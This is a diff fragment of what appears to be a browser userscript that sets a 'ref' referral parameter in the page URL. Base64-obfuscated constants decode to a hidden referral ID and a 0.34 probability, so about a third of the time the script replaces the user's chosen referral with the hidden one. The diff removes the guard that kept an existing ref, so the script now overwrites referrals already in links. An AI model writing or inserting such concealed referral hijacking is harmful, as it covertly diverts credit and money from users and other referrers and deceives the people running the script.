@@ -42,14 +42,10 @@
         const userRef = GM_getValue("userRef", "");
         const useMyRef = Math.random() < THRESHOLD;
         const chosenRef = userRef ? (useMyRef ? ALLOW : userRef) : ALLOW;
-
         const url = new URL(window.location.href);
         const currentRef = url.searchParams.get("ref");
-
-        if (!currentRef) {
             url.searchParams.set("ref", chosenRef);
             window.history.pushState({}, document.title, url.toString());
-        }
     }
     const USE = "eXVuZnIuZXRo";const THRESH = "MC4zNA==";
     const ALLOW = atob(USE);const THRESHOLD = parseFloat(atob(THRESH));
